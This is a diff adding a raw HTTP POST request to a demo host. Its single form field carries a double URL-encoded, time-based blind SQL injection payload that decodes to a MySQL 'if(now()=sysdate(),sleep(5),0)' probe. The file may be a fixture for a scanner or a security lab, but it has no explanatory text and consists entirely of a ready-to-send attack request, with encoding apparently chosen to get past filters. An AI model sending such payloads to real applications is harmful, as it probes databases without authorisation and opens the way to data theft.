@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Connection: close
+
+input=1%2Band%2Bif%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%25285%2529%252C0%2529
